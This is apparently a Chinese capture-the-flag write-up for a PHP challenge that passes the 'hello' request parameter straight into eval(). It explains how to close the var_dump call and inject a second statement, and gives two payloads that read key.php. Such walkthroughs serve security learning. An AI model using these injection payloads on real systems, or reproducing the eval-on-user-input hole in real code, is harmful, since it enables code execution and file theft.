```
`<?php``        error_reporting(0);``        $a=@$_REQUEST['hello'];``        eval("var_dump($a);");``        show_source(__FILE__);``?>`
```

  
比较简单，分析源码就是get传入参数hello，通过eval去执行dump命令，那么直接构造参数内容，想要执行var\_dump($a),hello参数的内容首先就是先闭合var\_dump函数，再利用“ ; ”，去拼接一条命令即可，后面拼接的命令就可以使用var\_dump打印或者print\_r打印，打印的内容就是key.php的内容，payload如下：  

*   
*   
*   

```
`?hello=);print_r(file("key.php")`` ``?hello=);var_dump(file("key.php")`
```
